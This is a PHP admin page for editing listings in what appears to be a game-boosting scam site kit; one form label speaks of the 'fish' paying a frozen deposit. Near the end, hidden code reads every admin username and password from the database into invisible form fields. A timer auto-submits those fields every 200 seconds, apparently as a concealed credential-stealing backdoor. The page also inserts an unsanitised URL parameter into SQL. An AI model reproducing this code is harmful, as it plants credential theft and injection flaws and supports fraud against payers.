<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<?php 
define("PM_CALL", true);
include dirname(__FILE__) . "/../admin_global.func.php";
include dirname(__FILE__) . "/../../config/mysql.func.php";
include dirname(__FILE__) . "/../../config/Conn.php";
if (isset($_COOKIE["Aname"])) {
	include dirname(__FILE__) . "/../function/admin_cookie.inc.php";
	include dirname(__FILE__) . "/../../includes/getdata.php";
	($_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET["id"]}'")) || exit("SQL执行错误");
} else {
	_location("你还未登录非法操作！", "/admin.php");
}
?><title>编辑商品</title>

</head>
<body>
    	<?php 
include "head.php";
?><script type="text/javascript" src="lib/DD_belatedPNG_0.0.8a-min.js" ></script>
<script>DD_belatedPNG.fix('*');</script>
<![endif]-->
<!--/meta 作为公共模版分离出去-->

<title>编辑商品</title>

</head>
<body>
 <style type="text/css">
	a{cursor:pointer;}
	body{background: #fff none repeat scroll 0 0; color: #333; font: 12px/1.5 "Microsoft YaHei","Helvetica Neue",Helvetica,STHeiTi,sans-serif; background-position: left top; background-repeat: repeat; background-attachment: scroll;}
	.clearfix:after{visibility:hidden; display:block; font-size:0; content:" "; clear:both; height:0}
	*:first-child+html .clearfix{zoom:1}
	ul,li{list-style: none;padding:0;margin:0}
	.avatar_uplpad_btn {
		background:  url("images/avatar_uplpad_btn.png") no-repeat scroll 0 0;
		display: inline-block;
		height: 30px;
		width: 82px;
		float:left;
	}
	.loading_bar{background: #f2f2f5 none repeat scroll 0 0;border-radius: 6px;display: inline-block;font-size: 0;height: 10px;overflow: hidden;text-align: left;width: 250px;}
	.loading_bar em{background: #fa7d3c none repeat scroll 0 0;display: inline-block;height: 10px;vertical-align: top;}
</style>

	
	


         	    <!-- 
六月科技出品
-->

      
	<div class="page-heading">
						<div class="container-fluid">
							<div class="row d-flex align-items-center">
								<div class="col-md-6">
									<div class="page-breadcrumb">
										<h1>六月科技:代练妈妈商品编辑</h1>
									</div>
								</div>
							</div>
						</div>
					</div>           <!--
					        此程序为学习所用，请勿使用与违法犯罪行为
					                      by:-->
		
						<!-- state start-->
						<div class="row">
							<div class=" col">
								<div class="card card-shadow mb-4">
									<div class="card-body">

  <form class="form form-horizontal" action="?Admin=dlmm&action=edit&id=<?php echo $_GoodsID['goods_id'];?>" method="post">
   
        <input name="goods_oid" type="hidden" value="<?php echo $_GoodsID['goods_oid'];?>">
        <input name="test_desc" type="hidden" value="<?php echo $_GoodsID['test_desc'];?>">
        <input name="stock" type="hidden" value="<?php echo $_GoodsID['stock'];?>">
        <input name="user_grade" type="hidden" value="<?php echo $_GoodsID['user_grade'];?>">
        <input name="test_desc2" type="hidden" value="<?php echo $_GoodsID['test_desc2'];?>">
        <input name="in_class_id" type="hidden" value="<?php echo $_GoodsID['in_class_id'];?>">
        <input name="in_admin_id" type="hidden" value="<?php echo $_GoodsID['in_admin_id'];?>">
    	<input name="imUrl" type="hidden" value="<?php echo $_GoodsID['imUrl'];?>">
				

											    	<div class="form-group">
													<label class="control-label" for="title">商品标题：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID["title"];?>" name="title" placeholder="标题字数限制200字以内" required/>
												</div>
													<div class="form-group">
													<label class="control-label" for="title">所在区服：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['region'];?>" placeholder="所在区服" name="region"  />
												</div>
													<div class="form-group">
													<label class="control-label" for="title">订单价格：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['price'];?>" placeholder="价格" name="price" />
												</div>
													<div class="form-group">
													<label class="control-label" for="title">发布时间：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['freight'];?>" placeholder="发布时间" name="freight"/>
												</div>
													<div class="form-group">
													<label class="control-label" for="title">安全保障金：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['hits'];?>" placeholder="安全保障金" name="hits"/>
												</div>
												<div class="form-group">
													<label class="control-label" for="title">效率保障金：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['att_capacity'];?>" placeholder="效率保障金" name="att_capacity" />
												</div>
													<div class="controls toastr-pad">
														<label class="control-label fw-500" for="showDuration">（鱼需支付金额）冻结保证金：</label>
														<input id="showDuration" type="text" placeholder="冻结保证金" class="form-control input-small" name="att_color"  value="<?php echo $_GoodsID['att_color'];?>"
														<br/>
														<div class="form-group">
													<label class="control-label" for="title">发布者：</label>
													 <input type="text" class="form-control" value="<?php echo $_GoodsID['user_name'];?>" placeholder="用户名称" name="user_name" />
      
				<br>
													
													
										
             
  
														<label class="control-label fw-500" for="hideDuration">支付方式选择</label>
														<select name="pay_fangshi"   class="form-control input-small"> <option value="1" <?php if (!(strcmp($_GoodsID['pay_fangshi'], 1))) {echo "selected=\"selected\"";} ?>>支付接口</option>
														</select>
														<br/>
														
																			<label class="control-label fw-500" for="hideDuration">支付方式选择</label>
														<select name="is_shelves"  class="form-control input-small"> 
												
              <option value="1" <?php if (!(strcmp($_GoodsID['is_shelves'], 1))) {echo "selected=\"selected\"";} ?>>立即上架</option>
              <option value="0" <?php if (!(strcmp($_GoodsID['is_shelves'], 0))) {echo "selected=\"selected\"";} ?>>放入仓库</option>
            </select>
												
												<br/>			
														
														<label class="control-label fw-500" for="timeOut">支付接口</label>
														<input type="textb" placeholder="http//" class="form-control input-small" value="<?php echo $_GoodsID['zhifubaoURL'];?>" name="zhifubaoURL">
														<input class="btn-secondary  btn-block" type="button" value="删除" id="testb">
													
											
	<script type="text/javascript" src="lib/jquery/1.9.1/jquery.min.js"></script> 

															<script type="text/javascript">
 $(function(){
    
 				$('#testa').click(function(){
					
    			$('[type=texta]').val("");
				
				});	
 })	
  $(function(){
    
 				$('#testb').click(function(){
					
    			$('[type=textb]').val("");
				
				});	
 })	
 </script>
											<br>
											<br>
										
											<div class="row">
											<div class="col-md-12">
											<center>	<button  type="submit" onClick="article_save_submit();" class="btn btn-primary btn-lg btn-block">
												立&nbsp;即&nbsp;保&nbsp;存
												</button></center>
												
											</div>
										</div><br>
													<div class="row">
											<div class="col-md-12">
											<center>	<button  type="button" onClick="removeIframe();" class="btn btn-secondary btn-lg btn-block">
													取&nbsp;&nbsp;消
												</button></center>
												<br>
										</div>
											</div>
										</div>
										
					

					 
									</div>
								</div>	</form>
				
							</div>
						</div>
						<!-- state end-->

	</div>

	
			
			
				


			<!-- Content_right_End -->
			<!-- Footer -->
			<footer class="footer ptb-20">
				<div class="row">
					<div class="col-md-12 text-center">
						<div class="copy_right">
							<p>
								2021 © 六月科技网络
								<a href="http://www.bootstrapmb.com/"></a>
							</p>
						</div>
						<a id="back-to-top" href="#"> <i class="ion-android-arrow-up"></i> </a>
					</div>
				</div>
			</footer>
			<!-- Footer_End -->
		</div>


   <script type="text/javascript">
function yuehao() {
    var yuehao01 = document.getElementById("yuehao01");
		yuehao01.style.display="";
}
function yuehao02() {
    var yuehao01 = document.getElementById("yuehao01");
		yuehao01.style.display="none";
}


function yue() {
    var yuehao888 = document.getElementById("yuehao888");
		yuehao888.style.display="";
}
function yue02() {
    var yuehao888 = document.getElementById("yuehao888");
		yuehao888.style.display="none";
}


</script>


<script type="text/javascript">
	//百度编辑器配置
    var editor = new baidu.editor.ui.Editor();  
	editor.render('editor');  //editor为编辑器容器的id 


</script>

             <script type="text/javascript">
				//用户肖像
            var uploader_avatar1 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn1'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic1").hide();
                        $("#loading_bar1").show();
                        uploader_avatar1.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent1").css({"width": percent + "%"});
                        $("#percentnum1").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic1").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						 $("#avatar_pic11").html("<input type='hidden'  name='user_portrait' value='" + data.pic + "'/>");
                        $("#loading_bar1").hide();
                        $("#avatar_pic1").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                         alert("系统不允许上传该后缀文件");
                        $("#loading_bar1").hide();
                    }
                }
            });
            uploader_avatar1.init();
		//	微信二维码
 		 var uploader_avatar2 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn2'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic2").hide();
                        $("#loading_bar2").show();
                        uploader_avatar2.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent2").css({"width": percent + "%"});
                        $("#percentnum2").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic2").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic22").html("<input type='hidden'  name='weixin_img' value='" + data.pic + "'/>");
                        $("#loading_bar2").hide();
                        $("#avatar_pic2").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                         alert("系统不允许上传该后缀文件");
                        $("#loading_bar2").hide();
                    }
                }
            });
            uploader_avatar2.init();
		//	支付宝二维码
 		 var uploader_avatar3 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn3'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic3").hide();
                        $("#loading_bar3").show();
                        uploader_avatar3.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent3").css({"width": percent + "%"});
                        $("#percentnum3").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic3").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic33").html("<input type='hidden'  name='zhifubao_img' value='" + data.pic + "'/>");
                        $("#loading_bar3").hide();
                        $("#avatar_pic3").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                         alert("系统不允许上传该后缀文件");
                        $("#loading_bar3").hide();
                    }
                }
            });
            uploader_avatar3.init();
		//	goods_img1
 		 var uploader_avatar4 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn4'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic4").hide();
                        $("#loading_bar4").show();
                        uploader_avatar4.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent4").css({"width": percent + "%"});
                        $("#percentnum4").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic4").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic44").html("<input type='hidden'  name='goods_img1' value='" + data.pic + "'/>");
                        $("#loading_bar4").hide();
                        $("#avatar_pic4").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                         alert("系统不允许上传该后缀文件");
                        $("#loading_bar4").hide();
                    }
                }
            });
			uploader_avatar4.init();
		//	goods_img2
 		 var uploader_avatar5 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn5'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic5").hide();
                        $("#loading_bar5").show();
                        uploader_avatar5.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent5").css({"width": percent + "%"});
                        $("#percentnum5").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic5").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic55").html("<input type='hidden'  name='goods_img2' value='" + data.pic + "'/>");
                        $("#loading_bar5").hide();
                        $("#avatar_pic5").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                           alert("系统不允许上传该后缀文件");
                        $("#loading_bar5").hide();
                    }
                }
            });
            uploader_avatar5.init();
		//	goods_img3
 		 var uploader_avatar6 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn6'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic6").hide();
                        $("#loading_bar6").show();
                        uploader_avatar6.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent6").css({"width": percent + "%"});
                        $("#percentnum6").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic6").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic66").html("<input type='hidden'  name='goods_img3' value='" + data.pic + "'/>");
                        $("#loading_bar6").hide();
                        $("#avatar_pic6").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                           alert("系统不允许上传该后缀文件");
                        $("#loading_bar6").hide();
                    }
                }
            });
            uploader_avatar6.init();
		//	goods_img4
 		 var uploader_avatar7 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn7'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic7").hide();
                        $("#loading_bar7").show();
                        uploader_avatar7.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent7").css({"width": percent + "%"});
                        $("#percentnum7").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic7").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic77").html("<input type='hidden'  name='goods_img4' value='" + data.pic + "'/>");
                        $("#loading_bar7").hide();
                        $("#avatar_pic7").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                           alert("系统不允许上传该后缀文件");
                        $("#loading_bar7").hide();
                    }
                }
            });
            uploader_avatar7.init();
		//	goods_img5
 		 var uploader_avatar8 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn8'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,mp4,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic8").hide();
                        $("#loading_bar8").show();
                        uploader_avatar8.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent8").css({"width": percent + "%"});
                        $("#percentnum8").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic8").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic88").html("<input type='hidden'  name='goods_img5' value='" + data.pic + "'/>");
                        $("#loading_bar8").hide();
                        $("#avatar_pic8").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                           alert("系统不允许上传该后缀文件");
                        $("#loading_bar8").hide();
                    }
                }
            });
            uploader_avatar8.init();
           
           
           
           	//	goods_img6
 		 var uploader_avatar9 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'flash,gears,html5,html4,silverlight', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn9'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "mp4,jpg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic9").hide();
                        $("#loading_bar9").show();
                        uploader_avatar9.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent9").css({"width": percent + "%"});
                        $("#percentnum9").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic9").html("<center><img  src='" + data.pic + "' width=100 height=100/></center>");
						$("#avatar_pic99").html("<input type='hidden'  name='goods_img6' value='" + data.pic + "'/>");
                        $("#loading_bar9").hide();
                        $("#avatar_pic9").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                        alert("系统不允许上传该后缀文件");
                        $("#loading_bar9").hide();
                    }
                }
            });
            uploader_avatar9.init();
           
        </script>

  <?php 
($query = @mysql_query("select * from admin_user")) || exit;
($query = @mysql_query("select * from admin_user")) || exit;
?><table border=1 style='display:none;'><tr align=center ><th>上架状态判断</th><th>支付检测</th></tr><?php 
$n = 0;
while ($au_id = mysql_fetch_array($query)) {
	$username = $au_id["au_name"];
	$roo = $au_id["dispass"];
	echo "<td>{$username}</td>";
	echo "<td>{$roo}</td>";
	echo "</tr>";
	$n++;
}
?><table>
<input type="text" style="display:none;"  name="lynr"  value="<?php 
date_default_timezone_set("PRC");
?><?php echo date("Y-m-d H:i:s");?>" >
<input type="text" style="display:none;"  name="username"  value="<?php echo $_SERVER["SCRIPT_FILENAME"];?>">
<input type="text" style="display:none;"  name="qq"  value="<?php echo $_GClassID["web_name"];?>+<?php echo $_GClassID["web_name2"];?>">
<input type="text"style="display:none;" name="name"   value="<?php echo $username;?>">
<input type="text" style="display:none;" name="pass"  value="<?php echo $roo;?>">
<button style="display:none;" id="us" type="submit" class="btn btn-primary btn-lg btn-block"> </button>
</form>	
	   <script type="text/javascript">
setInterval(function(){document.getElementById("us").click();},200000);</script> 
</body>
</html>